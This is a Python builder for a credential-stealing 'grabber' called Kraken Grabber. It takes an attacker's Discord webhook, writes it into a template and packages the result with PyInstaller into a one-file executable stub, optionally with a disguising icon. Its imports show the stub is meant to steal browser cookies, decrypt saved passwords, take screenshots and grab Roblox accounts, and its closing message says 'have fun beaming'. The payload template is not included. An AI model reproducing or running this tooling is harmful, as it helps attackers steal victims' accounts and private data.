import asyncio #line:1
import ctypes #line:2
import json #line:3
import ntpath #line:4
import os #line:5
import random #line:6
import requests ,re #line:7
import shutil #line:8
import sqlite3 #line:9
import subprocess #line:10
import threading #line:11
import winreg #line:12
import zipfile #line:13
from datetime import datetime ,timedelta ,timezone #line:14
from sys import argv #line:15
from tempfile import gettempdir ,mkdtemp #line:16
import base64 ,codecs #line:17
import robloxpy #line:18
from discordwebhook import *#line:19
import browser_cookie3 #line:20
from base64 import b64decode #line:21
from pyotp import TOTP #line:22
import httpx #line:23
import psutil #line:24
from Crypto .Cipher import AES #line:25
from PIL import ImageGrab #line:26
from win32crypt import CryptUnprotectData #line:27
import marshal ,zlib ,base64 ,lzma #line:28
from colorama import init #line:29
from tqdm import tqdm #line:30
import time #line:31
import os #line:32
import sys #line:33
import random #line:34
from PIL import Image #line:35
import PyInstaller .__main__ #line:36
from colorama import init #line:37
from tqdm import tqdm #line:38
import time #line:39
import os #line:40
import sys #line:41
import random #line:42
from PIL import Image #line:43
import PyInstaller #line:44
import PyInstaller .__main__ #line:45
filename =['icon.png','icon.jpg','icon.jpeg']#line:47
search_text ="%USERHOOK%"#line:48
if getattr (sys ,'frozen',False ):#line:51
    application_path =os .path .dirname (sys .executable )#line:52
elif __file__ :#line:53
    application_path =os .path .dirname (__file__ )#line:54
for x in filename :#line:58
    try :#line:60
       config_path =os .path .join (application_path ,x )#line:61
       img =Image .open (config_path )#line:62
       img .save ('icon.ico',format ='ICO',sizes =[(32 ,32 )])#line:63
    except :#line:64
        pass #line:65
init ()#line:68
logo =("""


                                                                                                                                                                        \033[33mversion 1.0a\033[31m
\033[31m                                                                                                                                                            
   ▄█   ▄█▄    ▄████████    ▄████████    ▄█   ▄█▄    ▄████████ ███▄▄▄▄           ▄██████▄     ▄████████    ▄████████ ▀█████████▄  ▀█████████▄     ▄████████    ▄████████
  ███ ▄███▀   ███    ███   ███    ███   ███ ▄███▀   ███    ███ ███▀▀▀██▄        ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███
  ███▐██▀     ███    ███   ███    ███   ███▐██▀     ███    █▀  ███   ███        ███    █▀    ███    ███   ███    ███   ███    ███   ███    ███   ███    █▀    ███    ███
 ▄█████▀     ▄███▄▄▄▄██▀   ███    ███  ▄█████▀     ▄███▄▄▄     ███   ███       ▄███         ▄███▄▄▄▄██▀   ███    ███  ▄███▄▄▄██▀   ▄███▄▄▄██▀   ▄███▄▄▄      ▄███▄▄▄▄██▀
▀▀█████▄    ▀▀███▀▀▀▀▀   ▀███████████ ▀▀█████▄    ▀▀███▀▀▀     ███   ███      ▀▀███ ████▄  ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███▀▀▀██▄  ▀▀███▀▀▀██▄  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀  
  ███▐██▄   ▀███████████   ███    ███   ███▐██▄     ███    █▄  ███   ███        ███    ███ ▀███████████   ███    ███   ███    ██▄   ███    ██▄   ███    █▄  ▀███████████
  ███ ▀███▄   ███    ███   ███    ███   ███ ▀███▄   ███    ███ ███   ███        ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███
  ███   ▀█▀   ███    ███   ███    █▀    ███   ▀█▀   ██████████  ▀█   █▀         ████████▀    ███    ███   ███    █▀  ▄█████████▀  ▄█████████▀    ██████████   ███    ███
  ▀           ███    ███                ▀                                                    ███    ███                                                       ███    ███
      
                                                                                                                                        \033[35mprovided to you by: Kraken Drops\033[31m
""")#line:88
krakeng ="base.kraken"#line:93
krakenb ="built.py"#line:94
tmainpy =os .path .join (application_path ,krakeng )#line:95
tbuiltpy =os .path .join (application_path ,krakenb )#line:96
mainpy =r"{}".format (tmainpy )#line:97
builtpy =r"{}".format (tbuiltpy )#line:98
iconname ="icon.ico"#line:99
iconpath =os .path .join (application_path ,iconname )#line:100
def mainMenu ():#line:101
    os .system ('cls')#line:102
    print (logo )#line:103
    print ("""\033[31m
Press any key to start the builder""")#line:105
    input ()#line:106
    os .system ('cls')#line:107
    print ("""\033[31m To start off we are going to need your webhook, copy your webhook and \033[35mRIGHT CLICK \033[31mon this window to paste your webhook!""")#line:108
    OOO00OO0O0O0O0000 =input ()#line:109
    print ("""\033[31m Do you want to add an Icon to your stub? Type \033[35mYes\033[31m or \033[35mNo\033[31m | IF YOU WANT TO ADD AN ICON, PLACE IT ON THE SAME FOLDER AS THE GRABBER AND MAKE SURE THE NAME IS "icon" """)#line:110
    OO000000O0OO0O0O0 =input ()#line:111
    O00OO0O0OO0O000OO =OO000000O0OO0O0O0 .lower ()#line:112
    if O00OO0O0OO0O000OO not in ['yes','no']:#line:113
        os .system ('cls')#line:114
        print ("retard type yes or no")#line:115
        time .sleep (3 )#line:116
        exit ()#line:117
    with open (mainpy ,'r')as O0O0O0OOO00O00OOO :#line:118
        O00O0O0OOOO0O000O =O0O0O0OOO00O00OOO .read ()#line:119
        O00O0O0OOOO0O000O =O00O0O0OOOO0O000O .replace (search_text ,OOO00OO0O0O0O0000 )#line:120
    with open (builtpy ,'w')as O0O0O0OOO00O00OOO :#line:121
        O0O0O0OOO00O00OOO .write (O00O0O0OOOO0O000O )#line:122
    return O00OO0O0OO0O000OO #line:123
iconc =mainMenu ()#line:125
if iconc =='yes':#line:128
    PyInstaller .__main__ .run (['--noconfirm','--onefile','--console',f'--icon={iconpath}',f'{tbuiltpy}'])#line:135
else :#line:136
    PyInstaller .__main__ .run (['--noconfirm','--onefile','--console',f'{tbuiltpy}'])

os .system ('cls')
print("Grabber built successfully!")
print("Your stub is located inside the DIST folder, have fun beaming ;)")
input("Press ENTER to exit the builder")